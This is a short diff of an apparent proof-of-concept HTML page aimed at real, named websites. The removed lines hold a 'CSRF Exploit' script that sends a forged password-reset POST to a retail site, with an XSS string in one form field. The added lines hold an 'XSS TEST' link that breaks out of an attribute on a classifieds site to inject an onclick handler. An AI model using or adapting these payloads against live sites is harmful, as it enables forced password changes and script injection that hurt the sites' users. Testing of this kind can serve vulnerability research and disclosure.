@@ -1,25 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>CSRF Exploit</title>
+<title>XSS TEST</title>
 </head>
 <body>
-<script>
-fetch("https://nz.myprotein.com/passwordReset.account", {
-method: "POST",
-headers: {
-"Content-Type": "application/x-www-form-urlencoded",
-"Referer": "https://nz.myprotein.com/",
-"Origin": "https://nz.myprotein.com/"
-},
-body: `resetRequest=1&customerEmail=test@test.com&newPassword=testing123&confirmPassword=testing123&wechatSetPassword=testing123&utm_source=test">'-alert()-'&test">"""<"
-"scr"ipt"
-"
-"
-a"lert(")""<"
-/script><
-!--//`
-});
-</script>
+<a href="https://www.preloved.co.uk/classifieds/furniture-fittings/all/uk/'accesskey='x'onclick='alert(/../)">Test Link</a>
 </body>
 </html>
